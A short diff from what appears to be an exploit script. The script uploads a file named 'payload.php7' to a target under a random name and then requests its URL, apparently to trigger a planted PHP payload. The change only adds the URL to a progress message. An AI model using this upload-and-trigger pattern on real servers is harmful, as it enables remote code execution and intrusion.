@@ -22,5 +22,5 @@ print(" * Fazendo Upload")
 
 url = ctx.upload(randomString(8), 'payload.php7', open('payload.php7'))
 
-print(" * Payloading...")
+print(f" * Payloading... url={url}")
 get(url)
